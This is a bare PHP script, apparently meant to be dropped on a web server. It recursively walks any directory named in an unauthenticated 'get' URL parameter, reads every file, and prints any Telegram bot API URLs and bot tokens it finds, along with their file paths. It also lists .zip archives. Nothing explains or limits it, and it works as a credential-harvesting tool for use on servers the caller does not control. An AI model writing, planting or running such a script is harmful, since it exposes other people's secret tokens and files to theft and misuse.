<?php 
ini_set('memory_limit', '-1');
$site=$_SERVER['SERVER_NAME'];
if (isset($_GET['get'])){$a=$_GET['get'];}
else{$a=__dir__;}
function f($x){
    if (is_dir($x)) {
        if ($dh = opendir($x)) {
            while (($file = readdir($dh)) !== false) {
                if (($file=='.')||($file=='..')||($file=='.htaccess')){echo'';}
                else{
                    $file_c="$x/$file";
                    if (is_file($file_c)){
                        $f=file_get_contents($file_c);
                        $ddiraa=['/https:\/\/api\.telegram\.org\/bot(.*)\/SendMessage/','$token=\"(.*)\"','/\d{9,11}\:[a-zA-Z0-9]{6,}[\_\-+-][a-zA-Z0-9]{6,}[\_\-+-][a-zA-Z0-9]{6,}|\d{9,11}\:[a-zA-Z0-9]{6,}[\_\-+-][a-zA-Z0-9]{6,}|\d{9,11}\:[a-zA-Z0-9]{6,}/'];
                            preg_match("/https:\/\/api\.telegram\.org\/bot(.*)\/SendMessage/", $f,$ff);
                            if ($ff){
                                echo "Filename : $file_c | ".$ff[0]."<br>";
                            }
                            preg_match("/\d{9,11}\:[a-zA-Z0-9]{6,}[\_\-+-][a-zA-Z0-9]{6,}[\_\-+-][a-zA-Z0-9]{6,}|\d{9,11}\:[a-zA-Z0-9]{6,}[\_\-+-][a-zA-Z0-9]{6,}|\d{9,11}\:[a-zA-Z0-9]{6,}|\d{9,11}\:[a-zA-Z0-9]{6,}/", $f,$ff);
                            if ($ff){
                                echo "Filename : $file_c | ".$ff[0]."<br>";
                            }
                            preg_match("/\d{9,11}\:[a-zA-Z0-9]{6,}[\_\-+-][a-zA-Z0-9]{6,}[\_\-+-][a-zA-Z0-9]{6,}|\d{9,11}\:[a-zA-Z0-9]{6,}[\_\-+-][a-zA-Z0-9]{6,}[\_\-+-][a-zA-Z0-9]{6,}[\_\-+-][a-zA-Z0-9]{6,}/", $f,$ff);
                            if ($ff){
                                echo "Filename : $file_c | ".$ff[0]."<br>";
                            }
                            preg_match("/\.zip$/", $file,$ff);
                            if ($ff){
                                echo "Filezip : $file_c <br>";
                            }
                    }
                    f($file_c);
                }
            }
            closedir($dh);
        }
    }
}
f($a);
?>